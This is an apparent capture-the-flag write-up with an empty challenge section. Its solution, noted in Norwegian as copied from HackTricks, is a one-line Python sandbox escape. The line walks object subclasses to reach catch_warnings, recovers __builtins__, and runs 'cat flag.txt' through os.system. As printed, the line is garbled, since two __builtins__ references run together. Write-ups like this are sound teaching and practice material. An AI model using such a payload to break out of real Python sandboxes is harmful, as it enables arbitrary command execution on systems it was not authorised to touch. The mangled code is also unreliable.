# Taskname
> Author: Mx. Task

## Challenge

## Solution

Copy-paste løsning fra hacktricks
https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python2-and-python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins____builtins__["__import__"]('os').system('cat flag.txt')
```

